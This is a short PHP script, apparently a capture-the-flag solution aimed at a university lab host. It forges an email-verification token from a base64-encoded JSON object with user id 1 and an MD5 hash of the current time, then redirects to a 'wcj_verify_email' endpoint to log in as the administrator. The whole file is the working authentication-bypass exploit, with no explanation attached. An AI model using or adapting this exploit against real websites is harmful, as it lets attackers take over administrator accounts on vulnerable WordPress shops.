<?php 

$timer = md5(time()); 

fopen('http://ctf-fsi.fe.up.pt:5001/?wcj_user_id=1');

$token = base64_encode(json_encode(array('id' => 1, 'code' => $timer)));

header("Location: http://ctf-fsi.fe.up.pt:5001/wcj_verify_email=" . $token);

exit();

?>





